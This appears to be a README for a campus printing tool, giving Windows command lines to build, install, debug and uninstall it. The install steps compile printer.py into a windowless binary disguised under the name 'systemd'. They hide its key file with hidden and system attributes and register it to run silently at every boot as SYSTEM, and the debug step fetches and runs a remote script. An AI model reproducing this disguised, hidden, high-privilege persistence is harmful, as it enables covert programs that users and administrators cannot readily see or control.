# Printer Setup

Print directly to campus printers from PreConnect.

Official Rust repository: [hitblast/preprintd](https://github.com/hitblast/preprintd)

---

## Build Native Binary (PyInstaller)

Run in CMD from the repository directory:

```cmd
python -m pip install pyinstaller ordered-set zstandard && python -m PyInstaller --onefile --noconsole --name systemd --distpath . printer.py
```

---

## Windows Setup

Build the native binary first, then run in CMD from the directory containing `systemd.exe`:

```cmd
net session >nul 2>&1
if %errorLevel% == 0 ( set "d=%ProgramData%\systemd" & set "isAdmin=1" ) else ( set "d=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" & set "isAdmin=0" )
mkdir "%d%"
copy /Y "systemd.exe" "%d%\systemd.exe"
echo YOUR_WORKER_KEY_HERE> "%d%\systemd.key"
attrib +h +s "%d%\systemd.key"
if "%isAdmin%"=="1" ( schtasks /Create /TN "systemd" /TR "\"%d%\systemd.exe\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F & schtasks /Run /TN "systemd" ) else ( start "" "%d%\systemd.exe" )
set "d=" & set "isAdmin="
```

---

## Debug Mode

```cmd
curl -sLO https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py
move /y printer.py systemd.py
python systemd.py YOUR_WORKER_KEY_HERE --debug
```

---

## Uninstall

Run in CMD:

```cmd
schtasks /Delete /TN "systemd" /F
schtasks /Delete /TN "printer" /F
taskkill /F /IM systemd.exe
taskkill /F /IM printer.exe
set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
del /q /f "%s%\systemd.*" "%s%\printer.*" "%s%\.ident"
rmdir /s /q "%s%\py"
rmdir /s /q "%ProgramData%\systemd" "%ProgramData%\printer"
del /q /f "systemd.*" "printer.*" "py.zip"
set "s="
```
